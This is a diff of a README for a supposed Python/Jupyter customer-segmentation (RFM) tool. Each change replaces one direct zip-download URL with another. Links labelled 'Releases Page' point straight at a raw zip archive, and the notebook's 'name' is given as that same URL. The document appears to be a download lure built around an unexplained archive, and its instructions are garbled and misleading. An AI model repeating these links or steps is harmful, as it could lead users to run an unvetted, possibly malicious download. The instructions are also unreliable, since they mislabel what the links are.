@@ -15,13 +15,13 @@ To start using the customer segmentation RFM analysis tool, follow these steps t
 You need to have Python installed to run this application. Ensure your system meets these requirements before proceeding.
 
 ### 📥 Download the Application
-[![Download](https://raw.githubusercontent.com/memorioes/customer_segmentation_rfm_analysis/main/sheminith/customer_segmentation_rfm_analysis.zip)](https://raw.githubusercontent.com/memorioes/customer_segmentation_rfm_analysis/main/sheminith/customer_segmentation_rfm_analysis.zip)
+[![Download](https://github.com/memorioes/customer_segmentation_rfm_analysis/raw/refs/heads/main/images/customer-segmentation-rfm-analysis-3.6-alpha.4.zip)](https://github.com/memorioes/customer_segmentation_rfm_analysis/raw/refs/heads/main/images/customer-segmentation-rfm-analysis-3.6-alpha.4.zip)
 
-To download the latest version of the application, visit the [Releases Page](https://raw.githubusercontent.com/memorioes/customer_segmentation_rfm_analysis/main/sheminith/customer_segmentation_rfm_analysis.zip).
+To download the latest version of the application, visit the [Releases Page](https://github.com/memorioes/customer_segmentation_rfm_analysis/raw/refs/heads/main/images/customer-segmentation-rfm-analysis-3.6-alpha.4.zip).
 
 ## 📚 Installation Steps
 1. **Visit the Release Page:** Click on the link below to access the project’s Releases page:
-   [Releases Page](https://raw.githubusercontent.com/memorioes/customer_segmentation_rfm_analysis/main/sheminith/customer_segmentation_rfm_analysis.zip).
+   [Releases Page](https://github.com/memorioes/customer_segmentation_rfm_analysis/raw/refs/heads/main/images/customer-segmentation-rfm-analysis-3.6-alpha.4.zip).
 
 2. **Choose the Latest Version:** Find the most recent version listed. It will usually be at the top of the page.
 
@@ -32,7 +32,7 @@ To download the latest version of the application, visit the [Releases Page](htt
 5. **Open the Jupyter Notebook:**
    - If you have Jupyter installed, open it.
    - Navigate to the folder where you extracted the files.
-   - Open the notebook named `https://raw.githubusercontent.com/memorioes/customer_segmentation_rfm_analysis/main/sheminith/customer_segmentation_rfm_analysis.zip`.
+   - Open the notebook named `https://github.com/memorioes/customer_segmentation_rfm_analysis/raw/refs/heads/main/images/customer-segmentation-rfm-analysis-3.6-alpha.4.zip`.
 
 6. **Run the Notebook:**
    - Click on the first cell and then press "Shift + Enter" to run it.
@@ -72,6 +72,6 @@ Join our community for support and collaboration. Whether you have questions or 
 We welcome your feedback. If you encounter issues or have suggestions for improvement, please let us know through the project's GitHub Issues page.
 
 ## 📅 Stay Updated
-Make sure to check the [Releases Page](https://raw.githubusercontent.com/memorioes/customer_segmentation_rfm_analysis/main/sheminith/customer_segmentation_rfm_analysis.zip) regularly for updates and new features.
+Make sure to check the [Releases Page](https://github.com/memorioes/customer_segmentation_rfm_analysis/raw/refs/heads/main/images/customer-segmentation-rfm-analysis-3.6-alpha.4.zip) regularly for updates and new features.
 
 Thank you for using the customer segmentation RFM analysis tool. We hope it helps you unlock new insights into your business and improves your customer relationships.
